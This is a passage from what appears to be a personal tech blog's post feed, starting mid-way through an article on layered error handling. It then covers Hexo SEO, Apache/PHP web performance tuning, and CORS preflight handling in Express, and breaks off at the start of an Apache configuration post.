class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sendErrorResponse</span>(req, res, error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Error-handling-in-controller-layer"><a href="#Error-handling-in-controller-layer" class="headerlink" title="Error handling in controller layer"></a>Error handling in controller layer</h4><p>In the provided code snippet, we see a global try-catch block wrapping the entry function of the controller. This approach ensures that any exceptions thrown during request processing are caught and handled gracefully. The controller is responsible for crafting and sending responses back to clients. In the provided code, HTTP status codes and appropriate responses are sent, ensuring a consistent and user-friendly experience.</p>
<p>Handling errors isn’t just about catching exceptions; it’s also about providing meaningful error messages to clients. In the provided example, the need for localization of error messages is evident. The error messages need to be translated according to the client’s language preference. To achieve this, a translation search key, such as <code>errOdc04044</code>, is used to retrieve the correct localized text. This localization information is crucial for delivering a user-centric experience, especially in applications with a global user base.</p>
<h3 id="Service-Layer"><a href="#Service-Layer" class="headerlink" title="Service Layer"></a>Service Layer</h3><p>The service layer is where complex business logic resides. It involves tasks such as data validation, interaction with the database, and building output data. In this layer, error handling is equally critical.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">async</span> <span class="title function_">createSystems</span>(<span class="params"><span class="attr">systemsToCreate</span>: <span class="title class_">SystemToCreate</span>[]</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> systemsAndConnectionsToCreateDb = <span class="keyword">await</span> <span class="title class_">ServiceHelper</span>.<span class="title function_">buildSystemsAndConnectionsToCreateDb</span>(</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">requestContext</span>,</span><br><span class="line">      systemsToCreate</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">const</span> affectedSystems = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">saveSystemsAndConnections</span>(systemsAndConnectionsToCreateDb);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">updateSearchView</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">btpSystemsToCreate</span>: <span class="title class_">IBtpSystemToCreate</span>[] = systemsToCreate.<span class="title function_">filter</span>(<span class="title class_">ServiceHelper</span>.<span class="property">isBtpSystem</span>);</span><br><span class="line">    <span class="keyword">if</span> (btpSystemsToCreate.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">syncUpTenantRelationshipsForCreation</span>(btpSystemsToCreate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">client</span>.<span class="title function_">commit</span>();</span><br><span class="line">    trace.<span class="title function_">exiting</span>();</span><br><span class="line">    <span class="keyword">return</span> affectedSystems;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">client</span>.<span class="title function_">rollback</span>();</span><br><span class="line">    <span class="keyword">const</span> error = <span class="title function_">tryToConvertToGenericError</span>(e);</span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>Data Validation:</strong> Input data received from the controller must be validated and converted to a suitable format for processing. This step helps prevent invalid or malicious data from causing issues further down the line.</li>
<li><strong>Database Interaction:</strong> When interacting with the database, error handling is paramount. Database errors, network issues, or unexpected data inconsistencies can all lead to exceptions. Handling these exceptions gracefully ensures the integrity of the application.</li>
<li><strong>Output Data:</strong> After processing, the service layer is responsible for building and formatting the output data that will be sent back to the controller for response generation.</li>
</ol>
<h4 id="Error-handling-in-the-service-layer"><a href="#Error-handling-in-the-service-layer" class="headerlink" title="Error handling in the service layer"></a>Error handling in the service layer</h4><p>The function in the service layer is wrapped in a global try-catch block. In this layer, errors can originate from utilities, helpers, or the database access layer. If an error is not recognized, it should be converted to a generic error.</p>
<h3 id="Database-Access-Layer-Dao"><a href="#Database-Access-Layer-Dao" class="headerlink" title="Database Access Layer (Dao)"></a>Database Access Layer (Dao)</h3><p>The database access layer is responsible for interacting with the database and handling errors that may arise during data retrieval or modification.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">private <span class="keyword">async</span> <span class="title function_">saveSystemsAndConnections</span>(</span><br><span class="line">  <span class="attr">systemsAndConnectionsToCreateDb</span>: <span class="title class_">ISystemAndConnectionToCreateDb</span>[]</span><br><span class="line">): <span class="title class_">Promise</span>&lt;<span class="title class_">ISystemDb</span>[]&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> affectedSystems = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">sharedDBAccess</span>.<span class="title function_">createSystemsAndConnections</span>(systemsAndConnectionsToCreateDb);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (affectedSystems.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="variable constant_">ERRORS</span>.<span class="title function_">duplicatedSystem</span>()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> _.<span class="title function_">merge</span>(affectedSystems.<span class="property">createdSystems</span>, affectedSystems.<span class="property">updatedSystems</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The errors could come from this layer directly. We generate error by a unified entry point and throw it to the caller. We don’t need to cope with the error too much in this layer. However, we need a set of error utilities to generate the error easily.</p>
<h2 id="Conclusion-Streamlining-Error-Handling-for-a-Reliable-Application"><a href="#Conclusion-Streamlining-Error-Handling-for-a-Reliable-Application" class="headerlink" title="Conclusion: Streamlining Error Handling for a Reliable Application"></a>Conclusion: Streamlining Error Handling for a Reliable Application</h2><p>In software development, mistakes are not only hurdles but helpful tools for enhancing dependability and user experience. By adhering to recommended methods in managing mistakes, such as sending error responses, transforming unknown errors into a standard format, adopting a unified approach to creating errors, offering error categories, and localizing error messages, developers can build software systems that are more resilient and user-friendly. Embracing mistakes as a part of the development process can result in more robust and reliable applications that serve users better.</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Practice</tag>
        <tag>Error Handling</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 站点 SEO 优化</title>
    <url>/experience/practice/frontend-stie-optimize/</url>
    <content><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Allow: /home/</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /about/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /js/</span><br><span class="line">Disallow: /css/</span><br><span class="line">Disallow: /fonts/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /fancybox/</span><br><span class="line">Sitemap: http://0x400.com/sitemap.xml</span><br><span class="line">Sitemap: http://0x400.com/baidusitemap.xml</span><br></pre></td></tr></table></figure>



<h2 id="站点地图"><a href="#站点地图" class="headerlink" title="站点地图"></a>站点地图</h2><p>首先安装<code>sitemap</code>和百度版本的<code>sitemap</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>打开配置文件<code>_config.yml</code>添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Sitemap</span><br><span class="line">sitemap:</span><br><span class="line">    path: sitemap.xml</span><br><span class="line">baidusitemap:</span><br><span class="line">    path: baidusitemap.xml</span><br></pre></td></tr></table></figure>

<p><code>hexo g</code> 以后会在站点 <code>public</code> 目录下生成 <code>baidusitemap.xml</code>和 <code>stiemap.xml</code>，如图：</p>
<p><img src="/images/20180321/Snipaste_2018-03-24_18-08-08.png"></p>
<h4 id="修改文章链接"><a href="#修改文章链接" class="headerlink" title="修改文章链接"></a>修改文章链接</h4><p>HEXO默认的文章链接形式为<code>domain/year/month/day/postname</code>，默认就是一个四级url，并且可能造成url过长，对搜索引擎是十分不友好的，我们可以改成<code>domain/postname</code> 的形式。编辑站点<code>_config.yml</code>文件，修改其中的<code>permalink</code>字段改为<code>permalink: :title.html</code>即可。</p>
<h4 id="首页title的优化"><a href="#首页title的优化" class="headerlink" title="首页title的优化"></a>首页title的优化</h4><p>更改<code>index.swig</code>文件，文件路径是<code>your-hexo-site\themes\next\layout</code>，将下面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125;  &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>改成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125;  &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>



<h4 id="keywords-和-description"><a href="#keywords-和-description" class="headerlink" title="keywords 和 description"></a>keywords 和 description</h4><p>在<code>\scaffolds\post.md</code>中添加如下代码，用于生成的文章中添加关键字和描述。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keywords:</span><br><span class="line">description:</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://hunao.info/2016/06/01/Hexo-Seo%E4%BC%98%E5%8C%96%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%9C%A8google%E6%90%9C%E7%B4%A2%E6%8E%92%E5%90%8D%E7%AC%AC%E4%B8%80/">http://hunao.info/2016/06/01/Hexo-Seo%E4%BC%98%E5%8C%96%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%9C%A8google%E6%90%9C%E7%B4%A2%E6%8E%92%E5%90%8D%E7%AC%AC%E4%B8%80/</a></li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB 性能优化实战</title>
    <url>/experience/practice/frontend-web-performance-optimization/</url>
    <content><![CDATA[<p>WEB 访问速度直接影响了用户体验，本文从以下几个方面对<a href="http://myjob.dlmu.edu.cn/">学校就业网</a>做了简单优化，</p>
<ul>
<li><p>减少 HTTP 请求</p>
</li>
<li><p>减少 TCP 连接</p>
</li>
<li><p>启用压缩</p>
</li>
<li><p>启用 HTTP 缓存</p>
</li>
<li><p>静态页面缓存</p>
</li>
</ul>
<span id="more"></span>

<p>优化前，首页请求总数达到 110 多个，每次请求完成时间 Finished 在 8s 左右，DOM 加载 DOMContentLoaded 在 4s 左右，页面加载 Load 在 6 秒。对页面进行优化后，首次请求如下图：</p>
<p><img src="/images/20170831/before.png"></p>
<p>二次请求如下：</p>
<p><img src="/images/20170831/load.png"></p>
<p>性能提高近 3 倍。</p>
<h2 id="减少-HTTP-请求"><a href="#减少-HTTP-请求" class="headerlink" title="减少 HTTP 请求"></a>减少 HTTP 请求</h2><p>减少 HTTP 请求可以间接减少 TCP 连接次数，减少页面加载时间。</p>
<p>使用打包工具 webpack 等可以将一个文件下的外引 JS、CSS 文件合并、压缩，也可以手动合并、压缩。</p>
<h2 id="减少-TCP-连接"><a href="#减少-TCP-连接" class="headerlink" title="减少 TCP 连接"></a>减少 TCP 连接</h2><p>HTTP 是无状态连接方式，作用于网络七层的应用层，在 HTTP 1.0 版本中，每个 HTTP 请求都会发起一个 TCP 连接，TCP 连接进行三次握手，因此每个 HTTP 请求都需要等待 TCP 连接完成才能返回数据。为了减少 TCP 连接的等待时间，实现连接复用，HTTP 1.1 版本引入 <code>keep-alive</code>以实现 TCP 多个 HTTP 请求共享 TCP 连接通道。</p>
<p>对于 Apache ，只需在配置文件 httpd.conf 中加入以下代码即可启用 keep-alive，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KeepAlive On</span><br><span class="line">MaxKeepAliveRequests 300</span><br><span class="line">KeepAliveTimeout  10</span><br></pre></td></tr></table></figure>

<p>KeepAlive 在增加访问效率的同时，也会增加服务器的压力。因此要根据服务器性能合理设置 MaxKeepAliveRequests 和 KeepAliveTimeout 的值。可参考<a href="http://51write.github.io/2014/04/09/keepalive/">《KeepAlive，你优化了吗》</a></p>
<p>【备注】 <code>keep-alive</code> 是 HTTP 1.1 和 1.0 版本的一个差异，此外 1.1 版本还引入了 5 中 HTTP 请求方式，OPTIONS、PUT、DELETE、TRACE、CONNECT，1.1 之后又增加了一种 PATCH。<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">详情</a></p>
<h2 id="启用压缩"><a href="#启用压缩" class="headerlink" title="启用压缩"></a>启用压缩</h2><p>HTTP 是超文本传输协议，如果以原始文本传输，传输速度并不是最优，为了使得文本传输数据包尽可能小，HTTP 允许使用 GZIP 等方式对文本进行压缩，请求头信息中的 <code>Accept-Encoding</code> 和 <code>Content-Type</code>控制压缩。开启 gzip 压缩以后，其体积可以减小 60%~90%，可以节省下大量的带宽与用户等待时间。</p>
<p>LAMP 架构中，配置 Apache 或 PHP 都可以开启 GZIP 压缩，根据情况选择其中一种方式即可，</p>
<h3 id="Apache-开启-GZIP"><a href="#Apache-开启-GZIP" class="headerlink" title="Apache 开启 GZIP"></a>Apache 开启 GZIP</h3><p>打开配置文件 httpd.conf，找到以下模块，去掉前面的注释，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadModule deflate_module modules/mod_deflate.so</span><br><span class="line">LoadModule headers_module modules/mod_headers.so</span><br></pre></td></tr></table></figure>

<p>添加以下代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule deflate_module&gt;</span><br><span class="line">SetOutputFilter DEFLATE</span><br><span class="line">SetEnvIfNoCase Request_URI .(?:gif|jpe?g|png)$ no-gzip dont-vary</span><br><span class="line">SetEnvIfNoCase Request_URI .(?:exe|t?gz|zip|bz2|sit|rar)$ no-gzip dont-vary</span><br><span class="line">SetEnvIfNoCase Request_URI .(?:pdf|doc|avi|mov|mp3|rm)$ no-gzip dont-vary</span><br><span class="line">AddOutputFilterByType DEFLATE application/x-javascript text/html text/plain text/xml text/css</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-开启-GZIP"><a href="#PHP-开启-GZIP" class="headerlink" title="PHP 开启 GZIP"></a>PHP 开启 GZIP</h3><p>PHP 开启 GZIP 可以通过修改配置文件，如果只针对特定 PHP 页面开启压缩，也可以使用 ob_start 函数</p>
<ul>
<li>修改 php.ini<br>打开 PHP 目录下的 php.ini 文件，找到 zlib.output_compression &#x3D; off，改为<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zlib.output_compression = On</span><br><span class="line">zlib.output_compression_level  = -1</span><br></pre></td></tr></table></figure></li>
<li>特定 PHP 文件开启 GZIP<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (substr_count($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;], &#x27;gzip&#x27;)) &#123;</span><br><span class="line">    ob_start(&#x27;ob_gzhandler&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>【备注 1】 PHP GZIP 以来 zlib 模块，PHP 4.3 以后 zlib 模块内置在 PHP 中，如果没有相应模块需要编译安装。<br>【备注 2】 为了 HTTP 性能， HTTP 2.0 版本中将使用二进制传输。</p>
<h2 id="启用-HTTP-缓存"><a href="#启用-HTTP-缓存" class="headerlink" title="启用 HTTP 缓存"></a>启用 HTTP 缓存</h2><p>HTTP 缓存对性能的优化是相当重要的，HTTP 花费的时间主要在等待和下载上，启用缓存后使用 Last-Modified 或者 ETag 监测资源的变化，如果资源不发生改变且本地缓存不过期，资源将直接从本地取回，缩短了 HTTP 请求的时间。</p>
<p>对于 Apache 服务器，可以通过 mod_expires 模块来设定 Expires HTTP 头或 Cache-Contro lHTTP 头的 max-age 指令，打开 httpd.conf 搜索 expires_module，确保该模块已经引入，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadModule expires_module modules/mod_expires.so</span><br></pre></td></tr></table></figure>

<p>添加以下代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_expires.c&gt;</span><br><span class="line">    ExpiresActive On</span><br><span class="line">    ExpiresByType text/css                &quot;access plus 1 week&quot;</span><br><span class="line">    ExpiresByType application/javascript  &quot;access plus 2 weeks&quot;</span><br><span class="line">    ExpiresByType image/x-icon            &quot;access plus 6 months&quot;</span><br><span class="line">    ExpiresByType image/gif               &quot;access plus 6 months&quot;</span><br><span class="line">    ExpiresByType image/png               &quot;access plus 6 months&quot;</span><br><span class="line">    ExpiresByType image/jpeg              &quot;access plus 6 months&quot;</span><br><span class="line">    ExpiresByType video/x-flv             &quot;access plus 6 months&quot;</span><br><span class="line">    ExpiresByType application/pdf         &quot;access plus 6 months&quot;</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p><strong>启用 keep-alive、gzip 和 cache-cotrol 后，头信息如下</strong></p>
<p><img src="/images/20170831/header.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Ranges:bytes</span><br><span class="line">Cache-Control:max-age=604800</span><br><span class="line">Content-Encoding:gzip</span><br><span class="line">Content-Length:12582</span><br><span class="line">Content-Type:text/css</span><br><span class="line">Date:Wed, 30 Aug 2017 11:51:04 GMT</span><br><span class="line">ETag:&quot;2006d7-f7b2-557cf4809c580&quot;</span><br><span class="line">Expires:Wed, 06 Sep 2017 11:51:04 GMT</span><br><span class="line">Last-Modified:Mon, 28 Aug 2017 12:17:42 GMT</span><br><span class="line">Server:Apache/2.2.15 (CentOS)</span><br><span class="line">Vary:Accept-Encoding</span><br></pre></td></tr></table></figure>

<h2 id="静态页面缓存"><a href="#静态页面缓存" class="headerlink" title="静态页面缓存"></a>静态页面缓存</h2><p>对于很少变化的 PHP 页面，可以将 PHP 解析结果缓存起来，动态页面静态化，以减少数据库操作，加快响应速度。</p>
<p>如下案例，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file  = &quot;./cache/index.html&quot;;</span><br><span class="line">$ctime = filectime($file);</span><br><span class="line">$expr = 3600*2; //过期时间 2 小时</span><br><span class="line"></span><br><span class="line">if(file_exists($file) &amp;&amp; $ctime+$expr&gt; time()) &#123;</span><br><span class="line">    echo file_get_contents($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    unlink($file); //删除过期的静态页文件</span><br><span class="line"></span><br><span class="line">    // 数据库操作</span><br><span class="line"></span><br><span class="line">    $content = ob_get_contents();</span><br><span class="line">    file_put_contents($file,$content); // 写入内容到对应静态文件中</span><br><span class="line">    ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="减少数据库操作"><a href="#减少数据库操作" class="headerlink" title="减少数据库操作"></a>减少数据库操作</h2><h3 id="使用-Memcached-缓存"><a href="#使用-Memcached-缓存" class="headerlink" title="使用 Memcached 缓存"></a>使用 Memcached 缓存</h3><ul>
<li><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install libevent libevent-deve</span><br><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -p 11211 -m 256m -vv</span><br><span class="line"></span><br><span class="line"># 后台启动</span><br><span class="line">memcached -p 11211 -m 256m -d</span><br><span class="line"></span><br><span class="line">-d是启动一个守护进程；</span><br><span class="line">-m是分配给Memcache使用的内存数量，单位是MB；</span><br><span class="line">-u是运行Memcache的用户；</span><br><span class="line">-l是监听的服务器IP地址，可以有多个地址；</span><br><span class="line">-p是设置Memcache监听的端口，，最好是1024以上的端口；</span><br><span class="line">-c是最大运行的并发连接数，默认是1024；</span><br><span class="line">-P是设置保存Memcache的pid文件。</span><br></pre></td></tr></table></figure>

<ul>
<li>在 PHP 中使用</li>
</ul>
<h3 id="MySQL-数据优化"><a href="#MySQL-数据优化" class="headerlink" title="MySQL 数据优化"></a>MySQL 数据优化</h3><p>PHP 操作数据库时，将数据缓存也是减少减小数据库压力增加响应速度的策略之一，使用 Redis 或 Memecached 可以实现。关于数据库的优化参考之前的相关文章。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.admin10000.com/document/4927.html">http://www.admin10000.com/document/4927.html</a></li>
<li><a href="http://51write.github.io/2014/04/09/keepalive/">http://51write.github.io/2014/04/09/keepalive/</a></li>
<li><a href="http://blog.wpjam.com/m/gzip/">http://blog.wpjam.com/m/gzip/</a></li>
<li><a href="https://teddysun.com/326.html">https://teddysun.com/326.html</a></li>
<li><a href="http://weizhifeng.net/high-performance-with-apache.html">http://weizhifeng.net/high-performance-with-apache.html</a></li>
<li><a href="https://www.renfei.org/blog/http-caching.html">https://www.renfei.org/blog/http-caching.html</a></li>
<li><a href="https://zh.wikipedia.org/wiki/HTTP/2">https://zh.wikipedia.org/wiki/HTTP/2</a></li>
<li><a href="http://www.imooc.com/article/1478">http://www.imooc.com/article/1478</a></li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>优化</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 CORS 跨域的一点点理解</title>
    <url>/experience/practice/frontend-learn-about-cros/</url>
    <content><![CDATA[<p>如果协议，端口（如果指定了一个）和域名对于两个页面是相同的，则两个页面具有相同的源，请求不同源的资源时涉及跨域请求。跨域请求有很多种，本文重点探讨 CORS 跨域请求。</p>
<span id="more"></span>

<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>请求不同源的资源时，浏览器的同源策略会对不同请求方式的资源做出限制，有一些标签可以可以嵌入第三方源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- &lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</span><br><span class="line"></span><br><span class="line">- &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域</span><br><span class="line"></span><br><span class="line">需要一个设置正确的Content-Type消息头。不同浏览器有不同的限制： IE, Firefox,</span><br><span class="line"></span><br><span class="line">Chrome, Safari(跳至CVE-2010-0051)部分 和 Opera。</span><br><span class="line"></span><br><span class="line">- &lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...</span><br><span class="line"></span><br><span class="line">- &lt;video&gt; 和 &lt;audio&gt;嵌入多媒体资源。</span><br><span class="line"></span><br><span class="line">- &lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。</span><br><span class="line"></span><br><span class="line">- @font-face引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源</span><br><span class="line"></span><br><span class="line">字体（same-origin fonts）。</span><br><span class="line"></span><br><span class="line">- &lt;frame&gt; 和 &lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>XMLHttpRequest 和 Fetch 等都需遵从同源策略（同源策略是基于浏览器的，浏览器或阻止<br>请求或阻止结果，CSRF 跨站就是阻止了结果，而有 Chrome 等浏览器阻止了 HTTP 到 HTTPS<br>的请求），如果请求的资源不属于同一个源则为跨域请求。跨域请求需要客户端支持。</p>
<h3 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h3><ol>
<li><p>请求方式为 PUT、DELETE、CONNECT、OPTIONS、TRACE、PATCH 中的一种</p>
</li>
<li><p>人为设置了非安全头信息字段，这些字段除了一下字段都应该被人为是不安全的</p>
<pre><code> Accept
 Accept-Language
 Content-Language
 Content-Type (but note the additional requirements below)
 DPR
 Downlink
 Save-Data
 Viewport-Width
 Width
</code></pre>
</li>
<li><p>Content-Type 取值不属于下列之一</p>
<pre><code> Content-Type 的值不属于下列之一:
 application/x-www-form-urlencoded
 multipart/form-data
 text/plain
</code></pre>
<p> 对于非简单请求，浏览器先发送一个使用 OPTIONS 方法的“预检请求”，请求的同时在头信息中携带两个字段</p>
<pre><code> Access-Control-Request-Headers:content-type  // 告知服务器携带自定义非安全字段
 Access-Control-Request-Method: POST // 告知服务器，实际请求将使用 POST 方法
</code></pre>
<p> “预检请求”的响应表明请求的源是否被允许跨域，请求自定的非安全字段是否被允许定义以及请求的方法是否被允许等。</p>
<pre><code> Access-Control-Allow-Headers:Content-Type, Content-Length,
 Authorization, Accept, X-Requested-With , yourHeaderFeild // 跨域请求可以定义这些非安全字段
 Access-Control-Allow-Methods:PUT, POST, GET, DELETE, OPTIONS  // 跨域请求可以使用这些方法
 Access-Control-Allow-Origin:* // 跨域可以是任意源
 Access-Control-Max-Age:86400 // 该时间内无需再次发起“预检请求”
</code></pre>
<p> 首部字段 Access-Control-Max-Age 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。</p>
</li>
</ol>
<h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>请求方式是 GET&#x2F;POST&#x2F;HEAD 之一 且请求头信息中 Content-Type 取值为 <code>application/x-www-form-urlencoded、multipart/form-data、text/plain</code>中的一种。简单请求与非简单请求最大的区别是简单请求没有<strong>预请求</strong>。对于简单请求，如果服务器未返回正确的响应首部，则请求方不会收到任何数据。</p>
<pre><code>GET /login HTTP/1.1
Host: 111.111.111.111:80
Content-Type: application/x-www-form-urlencoded
Cache-Control: no-cache
Postman-Token: 52804546-8b1b-7dad-0d96-ea14a4c41241
</code></pre>
<p>但 AJAX 发送跨域请求时，浏览器会在请求头信息中添加 origin 字段以表示请求的来源，服务端通过 <code>Access-Control-Allow-Origin</code> 字段设置允许跨域请求的地址。只有当 origin 的取值被包含在 <code>Access-Control-Allow-Origin</code>的值时跨域才被允许。</p>
<h3 id="客户端请求头信息设置"><a href="#客户端请求头信息设置" class="headerlink" title="客户端请求头信息设置"></a>客户端请求头信息设置</h3><p>基于 Node 的 Express 头信息设置：</p>
<pre><code>app.all(&#39;*&#39;, function(req, res, next) {
	res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); // * 代表允许所有跨域
	res.header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type,
	Content-Length, Authorization, Accept,X-Requested-With&quot;);
	res.header(&quot;Access-Control-Allow-Methods&quot;,
	&quot;PUT,POST,GET,DELETE,OPTIONS&quot;);  // 允许跨域请求的方式
	res.header(&quot;X-Powered-By&quot;, &#39; 3.2.1&#39;)
	res.header(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;);
	next();
});
</code></pre>
<p><strong>[坑]Node 跨域头的设置</strong></p>
<p>在发送跨域请求时如果是非简单请求将会先发送 OPTIONS “预检请求”，而 Node 服务在没有设置 OPTIONS 路由的情况下前端会有 503 的网关超时提示：</p>
<pre><code> XMLHttpRequest cannot load http://111.111.111.111:8089/login_service. Response to
 preflight request doesn&#39;t pass access control check: No
 &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin
 &#39;http://111.111.111.111&#39; is therefore not allowed access. The response had HTTP
 status code 504.
</code></pre>
<p>因此为了避免才坑，后端需要对 OPTIONS 方式进行路由设置或提前返回结果，如下设置：</p>
<pre><code>app.all(&#39;*&#39;,function (req, res, next) {
	res.header(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;);
	res.header(&#39;Access-Control-Allow-Headers&#39;, &#39;Content-Type, Content-Length,
	Authorization, Accept, X-Requested-With , yourHeaderFeild&#39;);
	res.header(&#39;Access-Control-Allow-Methods&#39;, &#39;PUT, POST, GET, DELETE, OPTIONS&#39;);

	if (req.method == &#39;OPTIONS&#39;) {
	   console.log(&#39;you can do that!!&#39;);
	   res.send(200); //让options请求快速返回
	} else {
		next();
	}
});
</code></pre>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul>
<li><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache 配置文件简述</title>
    <url>/experience/practice/linux-apache-config/</url>
    <content><![CDATA[<p>本文简书 Apache 配置文件。</p>
<span id="more"></span>
